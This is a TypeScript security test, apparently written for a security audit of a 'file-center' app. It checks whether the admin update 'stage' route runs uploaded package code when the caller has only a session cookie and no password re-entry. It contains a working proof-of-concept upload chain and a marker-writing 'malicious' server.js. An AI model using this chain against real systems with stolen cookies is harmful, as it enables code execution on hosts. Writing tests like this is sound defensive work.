// F8: POST /api/admin/update/stage runs the uploaded package's code (smokeTest spawns server.js)
// with only requireAdmin + enabled() -- NO confirmPassword. The password step-up is only on /apply.
// So a stolen admin cookie (no password) triggers arbitrary code execution on the host during staging,
// defeating the documented "a stolen session cookie is not enough to install code" control.
// We stage a package whose server.js writes a marker file at startup, using ONLY the session cookie.
// CONFIRMED (42) if the marker is written (uploaded code executed without the password step-up).
// SAFE  (0)      if staging is refused without the password (no marker).
import { mkdirSync, writeFileSync, statSync, existsSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { freshEnv, login, post } from './helper'

const env = freshEnv({ FC_SUPERVISED: '1', MIN_FREE_SPACE: '0' })
const srcIndex = process.env.FC_SRC ?? '../../src/index'
const { app } = await import(srcIndex)

const MARKER = join(env.base, 'PWNED_BY_STAGE')

// malicious package: server.js executes attacker code (writes MARKER) on startup, then boots to pass smoke test
const pkg = join(env.base, 'pkg')
mkdirSync(join(pkg, 'web'), { recursive: true })
const serverJs = `import { writeFileSync } from 'node:fs'
writeFileSync(${JSON.stringify(MARKER)}, 'code-ran-without-password')
const port = Number(process.env.PORT)
Bun.serve({ port, hostname: '127.0.0.1', fetch(req) {
  const u = new URL(req.url)
  if (u.pathname === '/api/health') return new Response(JSON.stringify({ status: 'ok', version: process.env.FC_VERSION }), { headers: { 'content-type': 'application/json' } })
  return new Response('<!doctype html><title>ok</title>', { headers: { 'content-type': 'text/html' } })
} })
`
writeFileSync(join(pkg, 'server.js'), serverJs)
writeFileSync(join(pkg, 'web', 'index.html'), '<!doctype html><title>ok</title>')
const manifest = {
  name: 'file-center', version: '2.0.0', builtAt: new Date().toISOString(),
  files: {
    'server.js': { sha256: '0'.repeat(64), size: statSync(join(pkg, 'server.js')).size },
    'web/index.html': { sha256: '0'.repeat(64), size: statSync(join(pkg, 'web', 'index.html')).size },
  },
}
writeFileSync(join(pkg, 'manifest.json'), JSON.stringify(manifest))
const zipPath = join(env.base, 'pkg.zip')
const z = Bun.spawnSync(['zip', '-X', '-q', zipPath, 'server.js', 'web/index.html', 'manifest.json'], { cwd: pkg })
if (!z.success) throw new Error('zip failed: ' + z.stderr.toString())
const zipBytes = new Uint8Array(readFileSync(zipPath))
const zipSize = zipBytes.byteLength

// log in as admin -> we hold ONLY the session cookie + csrf (no password re-entry anywhere below)
const admin = await login(app as any, 'admin', env.adminPassword)
if (admin.status !== 200) throw new Error('admin login failed: ' + admin.status)

// 1) announce the update upload
const up = await post(app as any, '/api/admin/update/upload', admin, { size: zipSize })
if (up.status !== 200) throw new Error('update/upload failed: ' + up.status + ' ' + (await up.text()))
const { id, total } = await up.json() as any
if (total !== 1) throw new Error('expected single chunk, got total=' + total)

// 2) PUT the single chunk (whole zip) to the generic upload route
const putRes = await app.handle(new Request(`http://localhost/api/upload/${id}/0`, {
  method: 'PUT',
  headers: { cookie: admin.cookie, 'x-csrf-token': admin.csrf, 'content-type': 'application/octet-stream' },
  body: zipBytes,
}))
if (putRes.status !== 200) throw new Error('chunk PUT failed: ' + putRes.status + ' ' + (await putRes.text()))

// 3) stage -- requireAdmin + enabled() only, NO password. This runs the uploaded server.js (smoke test).
const stageRes = await post(app as any, '/api/admin/update/stage', admin, { id })
const stageStatus = stageRes.status
const stageBody = await stageRes.text()
console.log('stage status =', stageStatus)

const ran = existsSync(MARKER)
console.log('marker written by uploaded code =', ran)

if (ran) {
  console.log('CONFIRMED: uploaded code executed during /stage with only an admin cookie (no password step-up)')
  process.exit(42)
}
console.log('SAFE: /stage did not execute uploaded code without the password (status ' + stageStatus + '): ' + stageBody.slice(0, 200))
process.exit(0)
